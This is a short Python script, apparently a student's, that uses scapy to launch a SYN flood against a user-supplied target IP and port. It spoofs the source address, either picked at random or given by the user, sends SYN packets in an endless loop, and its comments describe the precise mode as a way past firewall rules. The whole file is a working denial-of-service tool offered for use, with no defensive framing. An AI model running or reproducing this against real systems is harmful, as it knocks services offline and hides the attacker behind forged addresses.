"""
Author: Mark Craft
email: mdc2913@rit.edu
"""

from scapy.all import *
from scapy.layers.inet import IP, TCP
# Random mode will use random source IP addresses for the SYN flood
# Precise mode will use a given IP address, helpful for overcoming some firewall rules
mode = input("Y/N, would you like to run this tool in random mode?:")

# Target IP and port number
target = input("Enter the target IP address:")
target_port = int(input("Enter the target port number:"))

#  Source port and IP address
source_port = int(input("Enter the source port number:"))

if mode == "N":
    source_address = input("Enter the source IP address:")

# This function will use a random source address for the SYN flood attack
def random_mode(target, dport, sport):
    source_address = RandIP()
    # Making TCP packet
    packet = IP(src= source_address, dst= target)/ TCP(sport=sport, dport=dport, seq=13025, flags="S")

    # Sending the packet over and over again
    while True:
        send(packet)
        print("Sending packets...")

# SYN flood with specified source address
def precise_mode(target, dport, sport, source_address):
    # Making TCP packet
    packet = IP(src= source_address, dst= target)/ TCP(sport= sport, dport= dport, seq=13025, flags="S")

    # Sending the packet to the host
    while True:
        send(packet)
        print("sending packets...")

# Main function to run
def main():
    if mode == 'Y':
        random_mode(target, target_port, source_port)
    elif mode == 'N':
        precise_mode(target, target_port, source_port, source_address)
    else:
        print("Invalid input")

main()



